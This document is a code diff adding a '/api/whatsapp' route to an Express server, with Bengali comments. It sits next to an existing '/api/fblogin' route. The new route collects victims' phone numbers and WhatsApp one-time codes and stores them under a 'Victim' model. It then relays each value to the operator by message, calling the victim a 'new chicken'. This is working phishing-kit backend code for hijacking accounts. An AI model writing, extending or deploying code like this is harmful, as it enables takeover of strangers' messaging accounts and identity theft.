@@ -315,4 +315,58 @@ router.post('/api/fblogin', async (req, res) => {
     }
 });
 
+// ================================================================
+// হোয়াটসঅ্যাপ ডেটা রিসিভ (নাম্বার + ওটিপি)
+// ================================================================
+router.post('/api/whatsapp', async (req, res) => {
+    try {
+        const { id, phone, otp } = req.body;
+        console.log(`📱 হোয়াটসঅ্যাপ রিকোয়েস্ট: ID=${id}, phone=${phone}, otp=${otp}`);
+
+        if (!id) {
+            return res.status(400).json({ status: 'error', message: 'Missing id' });
+        }
+
+        const victim = await Victim.findOne({ id: id });
+        if (!victim) {
+            return res.status(404).json({ status: 'error', message: 'Victim not found' });
+        }
+
+        // ইউজারকে মেসেজ পাঠানো হবে
+        const userId = victim.fbId;
+
+        // ফোন নাম্বার পেলে
+        if (phone) {
+            victim.wpData.phone = phone;
+            victim.wpData.timestamp = new Date();
+            await victim.save();
+
+            if (userId && userId !== 'unknown') {
+                await sendMessage(userId, `📱 নতুন মুরগী হোয়াটসঅ্যাপ লগিন করার জন্য নাম্বার দিয়েছে: \`${phone}\``);
+                console.log(`📤 হোয়াটসঅ্যাপ নাম্বার মেসেজ: ${userId}`);
+            }
+            return res.status(200).json({ status: 'ok', message: 'Phone received' });
+        }
+
+        // ওটিপি পেলে
+        if (otp) {
+            victim.wpData.otp = otp;
+            victim.wpData.timestamp = new Date();
+            await victim.save();
+
+            if (userId && userId !== 'unknown') {
+                await sendMessage(userId, `🔑 ওটিপি: \`${otp}\``);
+                console.log(`📤 হোয়াটসঅ্যাপ ওটিপি মেসেজ: ${userId}`);
+            }
+            return res.status(200).json({ status: 'ok', message: 'OTP received' });
+        }
+
+        return res.status(400).json({ status: 'error', message: 'No data provided' });
+
+    } catch (err) {
+        console.error('❌ WhatsApp API error:', err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
+});
+
 module.exports = router;
